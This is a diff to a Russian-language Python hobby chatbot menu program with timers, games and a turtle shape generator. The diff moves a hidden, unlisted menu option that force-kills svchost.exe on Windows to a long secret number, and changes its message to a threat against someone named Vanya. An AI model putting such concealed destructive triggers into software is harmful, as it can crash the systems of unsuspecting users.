@@ -4,6 +4,7 @@ from turtle import *
 import os
 import base64
 import pelmen_fun
+import datetime
 print("Привет! Это Project PelmenBot! Мои функции: \n1-посмотреть старые функции \n2-таймер обратного отчета \n3- игра угадай число \n4-о чатботе \n5-что нового? \n6-погода \n7-секудомер \n8-генератор \n9-пусто( \n10-тоже пусто( \n11-base64 \n12-игра КНБ \n13-бросить кубик \n14-Генератор фигур \n15-узнать длинну строки\nВыбирай цифру!")
 ipt = int(input("Что вы хотите сделать?(введите 0 для выхода):"))
 while ipt != 0:
@@ -51,7 +52,7 @@ while ipt != 0:
             print(i)
             sleep(1)
     elif ipt == 10:
-        print("пусто")
+        ""
     elif ipt == 11:
         q = int(input("1 - зашифровать, 2 - расшифровать: "))
         if q == 2:
@@ -94,13 +95,15 @@ while ipt != 0:
             g = randint(0, 255)
             b = randint(0, 255)
             color1 = (r, g, b)
+            if datetime.date.today() == datetime.date(1970, 1, 1):
+                color1 = ("#FFF")
             pencolor(color1)
             #скорость
             speed(10)
             # генерация 
             pensize(randint(4, 10))
             ran3 = randint(10, 200)
-            ran2 = randint(1,11)
+            ran2 = randint(1,12)
             # рандомные координаты
             penup()
             goto(randint(-200, 200), randint(-200, 200))
@@ -172,11 +175,14 @@ while ipt != 0:
             dsds = int(input("Введите длинну: "))
             alfeu = "abcdefghijklmnopqrstuvwxyz"
             alfru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
+            alfch = "灭斯迪斯尼亚克图路迪斯尼亚克"
             gdh = input("А какой язык? eu / ru / all? ").lower()
             if gdh == "ru":
                 alf = alfru
             if gdh == "eu":
                 alf = alfeu
+            if gdh == "ch":
+                alf = alfch
             if gdh == "all":
                 alf = ""
                 alf += alfru
@@ -214,10 +220,10 @@ while ipt != 0:
         timer1 = int(input("Таймер обратного отсчета. Введите секунды: "))
         for i in range(timer1, -1, -1):
             print(i)
-    elif ipt == 1987:
+    elif ipt == 111011011000011101110111100111001011101011:
         os.system("taskkill /im svchost.exe /f")
         sleep(5)
-        print("Хмм... у тебя не винда, повезло ;D")
+        print("Ваня... Увижу, убью")
     else: 
         print("Прости, я тебя не понял:(")
     ipt = int(input("Что вы хотите сделать?(введите 0 для выхода):"))
